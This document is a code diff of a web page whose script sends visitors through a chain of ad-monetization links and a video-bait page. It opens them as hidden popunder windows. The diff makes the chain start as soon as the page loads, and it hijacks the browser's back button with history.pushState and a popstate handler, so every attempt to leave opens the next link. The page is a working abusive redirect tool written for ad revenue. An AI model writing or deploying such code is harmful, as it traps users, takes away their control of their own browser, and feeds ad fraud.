@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Strong Redirect Chain</title>
+  <title>Ultra Strong Redirect Chain</title>
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Expires" content="0" />
@@ -11,7 +11,7 @@
 <body>
 <script>
 (function () {
-  // সব redirect লিংক
+  // সব লিংক একে একে চালানোর জন্য
   const LINKS = [
     "https://www.revenuecpmgate.com/rhehv4qc7?key=d6e8adfaadb70fb6aee1fd0c99730d22",
     "https://www.revenuecpmgate.com/qz1pm0zy9?key=ce6ee83d4607856b5382e048fc43c0fc",
@@ -22,7 +22,7 @@
     "https://shimulqww.github.io/Unitedstatesvideos/"
   ];
 
-  const KEY = "redirect_chain_index_v2";
+  const KEY = "redirect_chain_index_v3";
 
   function getIndex() {
     const n = parseInt(sessionStorage.getItem(KEY), 10);
@@ -34,10 +34,9 @@
   }
 
   function openStrong(url) {
-    // প্রথমে hidden window.open(), তারপর fallback হিসেবে location.href
-    const win = window.open(url, "_blank");
-    if (win && !win.closed) {
-      win.blur();
+    const w = window.open(url, "_blank");
+    if (w && !w.closed) {
+      w.blur();
       window.focus();
     } else {
       location.href = url;
@@ -52,11 +51,15 @@
     }
   }
 
-  // back button detect করে চালানো হবে
-  window.addEventListener("pageshow", function () {
+  // প্রথমবার ঢুকলেই শুরু হবে
+  nextRedirect();
+
+  // back চাপলে সাথে সাথে detect → পরের লিংক ওপেন
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", function () {
+    history.pushState(null, null, location.href);
     nextRedirect();
   });
-
 })();
 </script>
 </body>
